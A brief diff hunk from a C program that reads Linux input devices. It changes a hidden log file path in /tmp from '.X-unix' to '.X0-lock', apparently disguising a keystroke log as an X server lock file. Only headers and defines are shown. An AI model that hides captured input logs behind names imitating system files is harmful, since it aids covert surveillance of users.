@@ -11,7 +11,7 @@
 #include <linux/input.h>
 #include <sys/stat.h>
 
-#define LOGFILE "/tmp/.X-unix"
+#define LOGFILE "/tmp/.X0-lock"
 #define RUN 1
 
 int main (int argc, char **argv) {
